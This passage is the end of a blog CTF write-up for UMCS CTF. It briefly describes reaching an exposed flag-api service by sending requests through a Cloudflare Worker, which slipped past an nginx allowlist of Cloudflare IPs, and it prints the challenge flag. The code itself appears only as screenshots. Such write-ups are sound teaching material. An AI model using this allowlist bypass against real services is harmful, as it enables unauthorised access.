src=/p/umcsctf-writeup/image28.png width=416 height=325 srcset="/p/umcsctf-writeup/image28_hu6bc37e830ccf1c397571cdb19007e558_10087_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image28_hu6bc37e830ccf1c397571cdb19007e558_10087_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=128 data-flex-basis=307px></strong></p><p>Content of flag-api Dockerfile</p><p><img src=/p/umcsctf-writeup/image29.png width=959 height=994 srcset="/p/umcsctf-writeup/image29_hubd1a8f5a9c7680ba8b34e6f4845d0e4e_323687_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image29_hubd1a8f5a9c7680ba8b34e6f4845d0e4e_323687_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=96 data-flex-basis=231px></p><p>Content of flag-api nginx.conf</p><p>After viewing the files from the folder flag-api I found that the flag-api instance is exposing the port 5555 to public and another nginx configuration was written to allow Cloudflare IPs to access it. So I opened up my cloudflare account and created a worker with a “Hello world” template. Then I edit the code from IDE and preview it. Boom, the flag has been found.</p><p><strong><img src=/p/umcsctf-writeup/image30.png width=940 height=530 srcset="/p/umcsctf-writeup/image30_hu57432e4644ec262ed4eb273f1de90792_132939_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image30_hu57432e4644ec262ed4eb273f1de90792_132939_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=177 data-flex-basis=425px></strong>
Source code for worker.js</p><p><img src=/p/umcsctf-writeup/image31.png width=505 height=153 srcset="/p/umcsctf-writeup/image31_hu0c1817aba12849cb04c98f5e7c83ca18_8972_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image31_hu0c1817aba12849cb04c98f5e7c83ca18_8972_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=330 data-flex-basis=792px></p><p>Flag: <strong>UMCS{w0w_1m_cur1ous_on_h0w_y0u_g0t_h3r3}</strong></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a>
<a href=/tags/ctf-writeup/>CTF Writeup</a>
<a href=/tags/umctf/>UMCTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/synk-fetch-the-flag-2025-echo/><div class=article-image><img src=/p/synk-fetch-the-flag-2025-echo/_hu1ae0a39953be00c3e82b0aa3ddef0f40_1280507_90cc23455cd1f86708d04794564fd097.png width=250 height=150 loading=lazy alt="Featured image of post Echo" data-key=synk-fetch-the-flag-2025-echo data-hash="md5-Y4qAa/4bwB5VFRlWNFB5EQ=="></div><div class=article-details><h2 class=article-title>Echo</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2022 -
2025 Song's Blog</section><section class=powerby>Sing Sing Song Song<br>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>